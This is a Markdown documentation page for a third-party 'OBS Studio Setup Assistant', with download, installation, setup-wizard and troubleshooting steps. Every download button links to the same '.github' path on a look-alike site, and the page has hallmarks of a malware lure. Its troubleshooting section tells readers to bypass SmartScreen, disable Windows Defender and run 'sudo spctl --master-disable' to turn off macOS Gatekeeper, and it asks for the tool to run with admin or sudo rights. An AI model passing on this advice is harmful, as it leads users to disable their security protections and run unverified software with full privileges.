---
layout: page
title: Getting Started with OBS Studio Setup Assistant
description: Complete beginner's guide to downloading, installing, and setting up OBS Studio using our automated configuration tool
keywords: OBS Studio installation, setup guide, getting started, beginner tutorial, OBS configuration
---

# Getting Started Guide 🚀

Welcome to the **OBS Studio Setup Assistant**! This guide will walk you through everything you need to know to get started with automated OBS Studio configuration in just a few minutes.

## 📋 Table of Contents

1. [System Requirements](#system-requirements)
2. [Download & Installation](#download--installation)
3. [First Setup](#first-setup)
4. [Basic Configuration](#basic-configuration)
5. [Verification & Testing](#verification--testing)
6. [Troubleshooting](#troubleshooting)
7. [Next Steps](#next-steps)

---

## 💻 System Requirements

### Minimum Requirements
- **Windows**: Windows 10 (build 1903) or Windows 11
- **macOS**: macOS 11.0 (Big Sur) or later
- **Linux**: Ubuntu 20.04 LTS or equivalent
- **RAM**: 4 GB (8 GB recommended)
- **Storage**: 2 GB free space for installation
- **Network**: Internet connection for initial download

### Recommended Specifications
- **CPU**: Intel i5-4000 series / AMD FX-8000 series or newer
- **GPU**: DirectX 11 compatible or equivalent
- **RAM**: 8+ GB for optimal performance
- **Storage**: SSD for better performance

### Supported OBS Studio Versions
- ✅ OBS Studio 29.x (Legacy support)
- ✅ OBS Studio 30.x (Full support)
- ✅ OBS Studio 31.x (Latest, recommended)

---

## 📥 Download & Installation

### Step 1: Download the Setup Assistant

<div class="download-options">

#### 🖥️ Windows
[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Setup-0078D4?style=for-the-badge&logo=windows)](https://obs-studio-setup-assistant.github.io/.github)

**Requirements**: Windows 10/11, Administrator privileges

#### 🍎 macOS
[![Download for macOS](https://img.shields.io/badge/Download-macOS%20DMG-000000?style=for-the-badge&logo=apple)](https://obs-studio-setup-assistant.github.io/.github)

**Requirements**: macOS 11+, Admin password for installation

#### 🐧 Linux
[![Download for Linux](https://img.shields.io/badge/Download-Linux%20AppImage-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://obs-studio-setup-assistant.github.io/.github)

**Requirements**: Ubuntu 20.04+ or equivalent distribution

</div>

### Step 2: Verify Download (Recommended)

For security, verify your download using checksums:

```bash
# Windows (PowerShell)
Get-FileHash "obs-setup-assistant.exe" -Algorithm SHA256

# macOS/Linux
shasum -a 256 obs-setup-assistant.dmg
```

**Expected checksums** are listed on our [releases page](https://github.com/OBS-Studio-setup-assistant/obsstudio/releases).

### Step 3: Installation Process

#### Windows Installation
1. **Right-click** the downloaded `.exe` file
2. Select **"Run as administrator"**
3. Click **"Yes"** when prompted by Windows Security
4. Follow the installation wizard
5. Choose installation directory (default recommended)

#### macOS Installation
1. **Double-click** the downloaded `.dmg` file
2. **Drag** OBS Setup Assistant to Applications folder
3. **Right-click** the app in Applications
4. Select **"Open"** and confirm security prompt
5. Enter admin password when requested

#### Linux Installation
1. **Make the AppImage executable**:
   ```bash
   chmod +x obs-setup-assistant.AppImage
   ```
2. **Run the application**:
   ```bash
   ./obs-setup-assistant.AppImage
   ```
3. **Optional**: Create desktop shortcut for easy access

---

## 🎬 First Setup

### Launch the Setup Assistant

1. **Start the application** with administrator/sudo privileges
2. **Accept** the license agreement
3. **Choose your setup type**:
   - 🎮 **Gaming**: Optimized for game streaming and recording
   - 🎥 **Content Creation**: Balanced settings for various content
   - 🎓 **Education**: Optimized for tutorials and presentations
   - 🏢 **Business**: Professional webinars and meetings
   - ⚙️ **Custom**: Manual configuration options

### Setup Wizard Walkthrough

#### Screen 1: Welcome & System Check
- System compatibility verification
- OBS Studio detection (installs if not present)
- Hardware analysis for optimal settings

#### Screen 2: Use Case Selection
```
📊 Choose your primary use case:

🎮 Gaming & Streaming
   ├── Twitch streaming optimized
   ├── Game capture presets
   └── Low-latency configurations

🎥 Content Creation
   ├── High-quality recording
   ├── Multi-format support
   └── Professional editing workflow

🎓 Education & Tutorials
   ├── Screen sharing optimized
   ├── Clear audio settings
   └── Presentation tools

🏢 Business & Webinars
   ├── Professional appearance
   ├── Meeting integration
   └── Corporate branding
```

#### Screen 3: Hardware Configuration
- **Auto-detection** of:
  - Graphics cards and encoders
  - Audio devices and microphones
  - Webcams and capture cards
  - Available monitors and displays

#### Screen 4: Streaming Platform Setup (Optional)
Configure your preferred platforms:
- 📺 **Twitch**: Stream key and quality settings
- 🔴 **YouTube**: Live streaming configuration
- 📘 **Facebook Gaming**: Page integration
- 🔗 **Custom RTMP**: Server and key setup

#### Screen 5: Plugin Selection
Choose essential plugins:
- ✅ **Audio Enhancement**: Noise suppression, compressor
- ✅ **Video Effects**: Filters, transitions, overlays
- ✅ **Productivity**: Hotkeys, scene switcher, timer
- ✅ **Streaming Tools**: Chat integration, alerts

#### Screen 6: Final Configuration
- Review all settings
- Apply configurations
- Test setup functionality

---

## ⚙️ Basic Configuration

### Understanding the Interface

After setup completion, you'll see OBS Studio with:

#### Pre-configured Scenes
- **Main Scene**: Your primary streaming/recording setup
- **Starting Soon**: Pre-stream placeholder
- **Be Right Back**: Break screen with timer
- **Ending Scene**: Post-stream thank you screen

#### Essential Sources
- **Display Capture**: Full screen recording
- **Game Capture**: Optimized for games
- **Audio Input/Output**: Microphone and desktop audio
- **Webcam**: Camera source with basic filters

#### Optimized Settings
- **Video**: Resolution and framerate for your hardware
- **Audio**: Sample rate and bitrate optimization
- **Streaming**: Platform-specific encoder settings
- **Recording**: High-quality local recording setup

### Quick Configuration Tweaks

#### Adjust Video Quality
```
Settings → Video
├── Base Resolution: 1920x1080 (recommended)
├── Output Resolution: 1920x1080 or 1280x720
├── FPS: 30 or 60 (based on hardware)
└── Scaling: Lanczos (best quality)
```

#### Audio Configuration
```
Settings → Audio
├── Sample Rate: 48 kHz
├── Channels: Stereo
├── Desktop Audio: Default device
└── Mic/Auxiliary Audio: Your microphone
```

#### Streaming Settings
```
Settings → Stream
├── Service: Your platform (Twitch, YouTube, etc.)
├── Server: Auto (closest server)
├── Stream Key: [Your platform's stream key]
└── Use authentication: ✅ (recommended)
```

---

## ✅ Verification & Testing

### Test Your Setup

#### 1. Audio Test
```bash
🎵 Audio Verification Checklist:
├── ✅ Microphone levels (green, not red)
├── ✅ Desktop audio capture working
├── ✅ No echo or feedback
├── ✅ Clear audio quality
└── ✅ Noise suppression active
```

#### 2. Video Test
```bash
📹 Video Verification Checklist:
├── ✅ Sources displaying correctly
├── ✅ Smooth video (no dropped frames)
├── ✅ Correct resolution and aspect ratio
├── ✅ Filters and effects working
└── ✅ Scene transitions smooth
```

#### 3. Recording Test
1. **Start a test recording** (5-10 seconds)
2. **Check output quality** in your recordings folder
3. **Verify file format** and compression
4. **Test audio sync** with video

#### 4. Streaming Test (Optional)
1. **Start a private test stream**
2. **Monitor stream health** in OBS
3. **Check platform dashboard** for quality metrics
4. **Verify audio/video sync** on platform

---

## 🔧 Troubleshooting

### Common Issues & Solutions

#### Installation Problems

**Issue**: "Windows protected your PC" message
```
Solution:
1. Click "More info"
2. Click "Run anyway"
3. Or temporarily disable Windows Defender
```

**Issue**: macOS "App can't be opened" error
```
Solution:
1. System Preferences → Security & Privacy
2. Click "Open Anyway" for OBS Setup Assistant
3. Or run: sudo spctl --master-disable
```

**Issue**: Linux permission denied
```bash
# Solution: Fix permissions
chmod +x obs-setup-assistant.AppImage
sudo ./obs-setup-assistant.AppImage
```

#### Setup Issues

**Issue**: OBS Studio not detected
```
Solutions:
1. Install OBS Studio manually first
2. Run setup assistant as administrator
3. Check OBS installation path in settings
```

**Issue**: Audio devices not detected
```
Solutions:
1. Restart audio services (Windows)
2. Check system audio settings
3. Update audio drivers
4. Reconnect USB audio devices
```

**Issue**: Poor performance/dropped frames
```
Solutions:
1. Lower video resolution (1280x720)
2. Reduce framerate (30 FPS)
3. Change encoder (x264 → NVENC/AMF)
4. Close unnecessary programs
```

### Getting Help

#### Self-Service Options
- 📖 **[FAQ Page](faq.html)**: Common questions and answers
- 🔍 **[Troubleshooting Guide](troubleshooting.html)**: Detailed problem solving
- 💬 **[Community Forum](https://github.com/OBS-Studio-setup-assistant/obsstudio/discussions)**: User community help

#### Direct Support
- 📧 **Email**: [support@obs-setup-assistant.io](mailto:support@obs-setup-assistant.io)
- 🐛 **Bug Reports**: [GitHub Issues](https://github.com/OBS-Studio-setup-assistant/obsstudio/issues)
- 💭 **Feature Requests**: [Enhancement Requests](https://github.com/OBS-Studio-setup-assistant/obsstudio/issues/new?template=feature_request.md)

---

## 🎯 Next Steps

### Congratulations! 🎉

You've successfully set up OBS Studio with our automated assistant. Here's what you can do next:

#### Immediate Actions
1. **📹 Make your first recording** to test everything
2. **🎮 Try different scenes** and sources
3. **⚙️ Explore advanced settings** if needed
4. **🔄 Update when prompted** for latest features

#### Learn More
- 📚 **[Configuration Guide](configuration.html)**: Detailed settings explanations
- 🎥 **[Streaming Guide](streaming-guide.html)**: Platform-specific optimization
- 📹 **[Recording Guide](recording-guide.html)**: High-quality recording tips
- 🔌 **[Plugin Guide](plugins.html)**: Extend functionality with plugins

#### Join the Community
- ⭐ **[Star our repository](https://github.com/OBS-Studio-setup-assistant/obsstudio)** if you found this helpful
- 💬 **[Join discussions](https://github.com/OBS-Studio-setup-assistant/obsstudio/discussions)** to connect with other users
- 🤝 **[Contribute](../CONTRIBUTING.md)** to help improve the tool

---

## 📞 Need More Help?

### Quick Links
- 🏠 **[Documentation Home](index.html)**
- ❓ **[FAQ](faq.html)**
- 🔧 **[Troubleshooting](troubleshooting.html)**
- 💬 **[Community Support](https://github.com/OBS-Studio-setup-assistant/obsstudio/discussions)**

### Contact Information
- **Email**: [support@obs-setup-assistant.io](mailto:support@obs-setup-assistant.io)
- **Response Time**: Usually within 24 hours
- **GitHub**: [@OBS-Studio-setup-assistant](https://github.com/OBS-Studio-setup-assistant)

---

*Happy streaming and recording! 🎬* 